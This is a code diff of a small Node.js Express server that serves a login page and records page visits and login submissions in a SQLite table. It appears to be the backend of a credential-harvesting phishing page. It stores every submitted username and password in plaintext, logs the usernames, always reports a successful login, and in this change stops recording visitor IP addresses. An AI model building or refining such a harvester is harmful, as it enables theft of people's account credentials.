@@ -17,27 +17,29 @@ db.run(`CREATE TABLE IF NOT EXISTS records (
     timestamp TEXT
 )`);
 
-function saveRecord(type, username = null, password = null, ip = 'Unknown') {
+function saveRecord(type, username = null, password = null) {
+    const ip = 'Unknown';
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
+    
     db.run("INSERT INTO records (type, username, password, ip, timestamp) VALUES (?, ?, ?, ?, ?)",
         [type, username, password, ip, timestamp]);
 }
 
-// Record visits
+// Record every visit
 app.get('/', (req, res) => {
-    saveRecord('Page Visit', null, null, req.ip || req.headers['x-forwarded-for']);
+    saveRecord('Page Visit');
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 app.get('/login.html', (req, res) => {
-    saveRecord('Login Page Visit', null, null, req.ip || req.headers['x-forwarded-for']);
+    saveRecord('Login Page Visit');
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
 // Login
 app.post('/api/login', (req, res) => {
     const { username, password } = req.body;
-    saveRecord('Login Attempt', username, password, req.ip || req.headers['x-forwarded-for']);
+    saveRecord('Login Attempt', username, password);
     console.log('Login Recorded:', username);
     res.json({ success: true });
 });
@@ -60,5 +62,5 @@ app.post('/api/clear', (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`Server running on port ${PORT}`);
+    console.log(`Server is running`);
 });
